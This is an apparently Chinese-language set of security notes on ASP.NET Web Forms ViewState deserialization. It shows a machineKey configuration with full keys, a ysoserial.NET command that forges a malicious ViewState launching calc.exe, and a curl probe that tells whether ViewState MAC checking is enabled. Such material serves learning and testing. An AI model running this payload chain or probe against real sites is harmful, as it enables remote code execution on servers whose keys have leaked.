...
Visual Studio 2022无法创建Web Forms项目的解决办法

https://marileeturscak.com/posts/how-to-add-aspx/
...
```csharp
<machineKey decryptionKey="51FE611365277B07911521B7CAFE3766751D16C33D96242F0E63E93FB102BCE2" decryption="AES" validationKey="BF579EF0E9F0C85277E75726BFC9D0260FADE8DE2864A583484AA132944F602D" validation="HMACSHA256" compatibilityMode="Framework45"/>
```

### 反序列化 RCE 漏洞利用代码
如果未正确配置 `ViewState` 的 MAC 验证或`web.config`泄露，攻击者可以伪造恶意的 ViewState 数据，导致反序列化漏洞。例如：
```shell
# ysoserial.NET 工具生成恶意 ViewState
 ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "calc.exe" --path="/login.aspx" --apppath="/"  --decryptionkey="51FE611365277B07911521B7CAFE3766751D16C33D96242F0E63E93FB102BCE2" --decryptionalg="AES" --validationkey="BF579EF0E9F0C85277E75726BFC9D0260FADE8DE2864A583484AA132944F602D" --validationalg="HMACSHA256"
...
![image-20250428144747226](https://cdn.jsdelivr.net/gh/Rain1er/images@main/img/image-20250428144747226.png)

这里黑盒有个小trick，来自.NET安全矩阵

```bash
curl uri/index.aspx?__VIEWSTATE=AAAA
```

如果返回 `此页的状态信息无效，可能已损坏 ` ，表示没有开启MAC，

如果返回`返回验证视图状态 MAC 失败`，表示开启了MAC认证，
